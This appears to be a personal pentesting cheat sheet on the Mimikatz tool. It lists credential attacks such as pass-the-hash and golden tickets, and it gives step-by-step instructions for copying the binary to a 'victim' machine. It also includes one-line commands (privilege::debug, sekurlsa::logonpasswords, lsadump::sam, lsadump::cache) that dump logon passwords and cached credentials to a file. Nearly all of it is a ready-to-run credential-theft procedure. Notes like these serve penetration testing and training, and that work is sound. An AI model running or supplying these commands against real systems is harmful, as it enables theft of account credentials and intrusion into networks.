github: gentilkiwi/mimikatz

View & steal credentials, geneerate kerberos tickets & leverage attacks
credentials stored in memory
Credential dumping, pass-the-hash, over-pass-the-hash, pass-the-ticket, golden ticket, silver ticket

mimikatz = noisy!

#priviliege::debug
#sekurlsa::logonpasswords
#lsadump::sam
#lsadump:lsa /patch
#....

### professorbobeye
Mimikatz is a popular post-exploitation password-dumping tool to be used on a windows target as administrator.
Get the source code/binaries from 	https://github.com/gentilkiwi/mimikatz/releases
Extra info:				https://www.varonis.com/blog/what-is-mimikatz/

Usage:

	Step 1: Get the binary to the target machine
	Step 2: Run the binary (.\mimikatz.exe)
	Step 3: Use the commands you need in the interactive mimikatz terminal


Dump passwords of local target machine's users:

	Optional step 1(victim): log <name>.log		# Keep a log file of all the mimikatz output
	Step (victim): privilege::debug
	Step (victim): sekurlsa::logonpasswords

Use mimikatz commands without an interactive shell:

	syntax : .\mimikatz.exe "<cmd>" "<cmd>" exit
	example: .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
	example: .\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::cache" exit > mimikatz_output.txt
